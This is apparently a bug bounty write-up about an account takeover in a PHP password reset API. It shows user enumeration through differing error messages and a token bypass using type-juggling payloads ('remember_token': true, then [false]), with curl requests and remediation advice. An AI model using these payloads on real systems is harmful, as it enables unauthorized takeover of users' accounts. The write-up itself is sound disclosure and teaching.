A bug bounty writeup on an unauthenticated account takeover via a password reset endpoint.

## Background

While hunting on a private program, I came across `console-api.redacted.com` — the backend API for a digital advertising platform. A quick look at their production JavaScript bundle revealed something interesting: a list of endpoints that intentionally required no authentication.

```js
this.unAuthPaths = [
  "/api/v1/users/active",
  "/api/v1/users/reset-password",  // ← no auth required
  "/oauth/token"
]
```

The `/api/v1/users/reset-password` endpoint caught my eye. Password reset flows are a classic hunting ground — they're complex, security-critical, and easy to get wrong.

## Step 1: User Enumeration via Differential Error Responses

My first probe was simple: send requests with different user IDs and observe what comes back.

```bash
# Valid user ID
curl -X POST \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"password":"Test","password_confirmation":"Test"}' \
  'https://console-api.redacted.com/api/v1/users/reset-password'
# → {"message":"Missing data"}
```

```bash
# Invalid user ID
curl -X POST \
  -H 'Content-Type: application/json' \
  -d '{"id":99999,"password":"Test","password_confirmation":"Test"}' \
  'https://console-api.redacted.com/api/v1/users/reset-password'
# → {"message":"Attempt to read property \"password\" on null"}
```

Two different error messages. That's a textbook user enumeration vulnerability — the server is telling me whether an account exists. By iterating IDs 1 through 500, I confirmed over 350 valid user accounts.

But more importantly — the endpoint was accepting a user-supplied `id` field and using it to look up accounts. That's a mass assignment problem waiting to be exploited.

## Step 2: Bypassing Token Validation with PHP Type Juggling

The normal password reset flow expects a `remember_token` — a cryptographically generated string sent to the user's email. The server compares the submitted token against the stored one before allowing the password change.

The code likely looked something like this:

```php
if ($user->remember_token == $request->remember_token) {
    // allow password reset
}
```

Notice the loose comparison (`==` instead of `===`). This is the classic PHP type juggling trap.

In PHP, when you compare a boolean `true` to any non-empty string using `==`, the result is true:

```php
true == "any_string_here"  // evaluates to true
```

So I tried sending `"remember_token": true` (a boolean, not a string) in the JSON body:

```bash
curl -X POST \
  -H 'Content-Type: application/json' \
  -d '{
    "id": 1,
    "password": "NewPassword123!",
    "password_confirmation": "NewPassword123!",
    "remember_token": true
  }' \
  'https://console-api.redacted.com/api/v1/users/reset-password'
```

Response:

```json
{"status":"success"}
```

The password for user ID 1 was changed. No authentication. No valid reset token. No email verification. Just a numeric ID and a boolean.

## The Validation Matrix

To confirm it was specifically the boolean type causing the bypass, I tested every variation:

| `remember_token` value | Response | |
| --- | --- | --- |
| `true` (boolean) | `{"status":"success"}` | ✅ PASSWORD CHANGED |
| `"test"` (string) | `{"message":"Missing User"}` | ❌ |
| `1` (integer) | `{"message":"Missing User"}` | ❌ |
| `""` (empty string) | `{"message":"Missing data"}` | ❌ |
| `null` | `{"message":"Missing data"}` | ❌ |
| omitted | `{"message":"Missing data"}` | ❌ |

Only the boolean `true` bypassed the check. The attack was clean, repeatable, and fully within my control.

## What Made This Critical

Two separate weaknesses combined into a single, devastating attack chain:

**Mass Assignment** — The endpoint accepted an `id` field in the request body without whitelisting permitted fields. This let me target any account by its numeric database ID instead of relying on a user-specific token.

**PHP Type Juggling** — The loose `==` comparison meant that sending a boolean `true` satisfied the token validation check regardless of what the actual stored token was.

Neither issue alone was necessarily exploitable in isolation. Together, they allowed a completely unauthenticated attacker to reset the password of any user account on the platform — including administrative accounts.

The attack required:

- Zero authentication
- Zero knowledge of the victim's current password
- Zero valid reset token
- Only: a valid numeric user ID (obtainable through the enumeration technique above)

## Impact

- ~350+ accounts were vulnerable, enumerable via the endpoint itself
- User ID 1 — typically the first admin account — was directly targetable
- Admin access would have exposed advertiser data, financial records, publisher credentials, and analytics for hundreds of advertisers
- The platform also featured an impersonation endpoint (`/api/v1/users/impersonate/{id}`) — admin compromise would allow accessing any customer account entirely

## The Silent Patch — And Why It Didn't Hold

A few days after I submitted the report, the triage team said they couldn't reproduce the issue on their end. When I went back to retest — `remember_token: true` no longer worked. No changelog, no acknowledgment. A quiet server-side change had been pushed.

At first I thought the vulnerability was fully patched. Then I tried something slightly different.

Instead of a boolean `true`, I sent an array containing a boolean:

```bash
curl -X POST \
  -H 'Content-Type: application/json' \
  -d '{
    "id": 1,
    "password": "NewPassword123!",
    "password_confirmation": "NewPassword123!",
    "remember_token": [false]
  }' \
  'https://console-api.redacted.com/api/v1/users/reset-password'
```

Response:

```json
{"status":"success"}
```

Still vulnerable. The silent patch had only blocked the exact `true` boolean — it hadn't fixed the underlying type juggling issue. PHP's loose comparison rules meant that an array containing `false` still evaluated as truthy in the comparison context, slipping right through the incomplete fix.

This is exactly why surface-level input filtering doesn't work as a security control. Blocking one type doesn't fix the root cause — it just shifts the payload. The real fix is strict comparison (`===`) and proper input type validation, not a blocklist of "bad" values.

I reported the bypass with the `[false]` payload, and the team continued their review.

## The Severity Downgrade — Medium?

When the report was finally accepted, the team closed it as Medium severity (CVSS 6.5).

I honestly don't know why they did that.

The initial triage had correctly assigned it Critical (CVSS 9.8) with the vector `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — which is exactly what this is. Unauthenticated, no user interaction, network-accessible, full integrity compromise. That's a 9.8 by the book.

The downgrade reasoning cited that an attacker would need to know the victim's email address to log in after changing the password — so they knocked Confidentiality down to Low and bumped Attack Complexity to High.

I pushed back. Needing an email address to complete a login is a post-exploitation step, not a condition for exploiting the vulnerability itself. The vulnerability is the unauthorized password change — that's already done the moment you get `{"status":"success"}`. CVSS scores the vulnerability and its direct impact, not what happens two steps later. And even if email knowledge counted, it's low-effort OSINT — predictable naming conventions, public profiles, the `/api/v1/users/active` endpoint the platform exposed. That doesn't meet the bar for AC:High under CVSS 3.1 spec.

The team didn't respond to my reconsideration request. The bounty was paid and the report was closed.

I genuinely don't have a good explanation for the rating. The downgrade appears to reflect the partially-mitigated state they observed during review — after the silent patch had already blocked `true` — rather than the full exploitability at the time of disclosure. Whatever the reasoning, a vulnerability that lets an unauthenticated attacker reset the password of any account, including admin accounts, on a live production platform is not Medium severity.

## The Fix

After the full investigation, the team shipped a proper remediation (confirmed through re-testing):

- `remember_token` now enforces `required|string` validation — boolean and array payloads are both rejected outright with "The remember token must be a string."
- User lookup was moved off the attacker-supplied `id` field and is now driven entirely by the `remember_token` value — the mass assignment path no longer exists
- Additional hardening: minimum password length and required-field validation

The remediation correctly addressed the root cause this time.

## Key Takeaways for Developers

1. **Use strict comparison (`===`)** — Never use `==` when comparing security tokens. PHP's loose comparison rules are a well-known source of authentication bypasses.
2. **Whitelist accepted fields** — Use `$request->only(['password', 'password_confirmation', 'token'])` in Laravel (or equivalent in your framework) instead of accepting arbitrary JSON fields.
3. **Validate the token first** — Token validation must happen before any user lookup or state mutation. Never identify the user from attacker-controlled input.
4. **Normalize error responses** — Returning different error messages for valid vs. invalid IDs on a public endpoint leaks account existence to anyone who asks.
5. **Silent patches create false confidence** — If you push a server-side fix without fixing the root cause, a determined researcher will find the bypass. Fix the logic, not the symptom.

This vulnerability was responsibly disclosed through a bug bounty platform and has been fully remediated. All testing was conducted within the scope of the authorized program.
